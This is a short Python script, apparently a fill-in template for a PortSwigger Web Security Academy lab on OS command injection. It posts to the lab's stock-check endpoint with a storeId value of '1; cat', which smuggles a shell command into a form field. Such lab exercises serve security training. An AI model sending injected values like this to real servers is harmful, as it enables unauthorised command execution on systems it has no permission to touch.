# <FMI> (Fill Me In) denotes a field you must modify
import requests

s = requests.Session()
stock_post_url = 'https://0a120031045a504d83abc4b700f0008c.web-security-academy.net/product/stock'
post_data = {
    'productId' : '1',
    'storeId' : '1; cat'
}
resp = s.post(stock_post_url, data=post_data)
print(resp.text)